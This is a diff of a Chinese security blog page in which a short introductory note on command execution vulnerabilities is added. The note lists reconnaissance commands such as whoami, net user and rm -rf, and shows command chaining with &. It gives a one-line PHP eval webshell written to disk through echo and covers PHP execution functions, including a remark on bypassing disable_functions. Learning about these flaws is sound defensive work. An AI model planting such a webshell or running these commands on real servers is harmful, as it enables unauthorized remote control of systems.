@@ -20,17 +20,17 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="极简地介绍命令执行漏洞(随时补充,未完待续)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令执行漏洞">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="极简地介绍命令执行漏洞(随时补充,未完待续)">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:44:00.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:44:00.574Z">
+<meta property="article:modified_time" content="2023-08-21T15:12:21.123Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="命令执行漏洞">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
@@ -222,11 +222,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:44:00" itemprop="dateCreated datePublished" datetime="2023-08-21T16:44:00+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:44:00 / 修改时间：23:12:21" itemprop="dateCreated datePublished" datetime="2023-08-21T16:44:00+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">极简地介绍命令执行漏洞(随时补充,未完待续)</div>
 
         </div>
       </header>
@@ -237,7 +248,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
+<p>dir / ls / rm -rf</p>
+<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
+<p>拿到了命令执行漏洞后还可能想要webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
+<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
+<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
+<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
+<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
+<p>passthru //只调用命令,他和system差不多</p>
+<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
+
     </div>
 
     
@@ -262,6 +284,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag"># 命令执行漏洞</a>
+          </div>
 
         
 
@@ -335,6 +360,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89"><span class="nav-text">命令执行漏洞定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%9A%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="nav-text">多行命令执行：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-text">命令执行函数：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +383,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
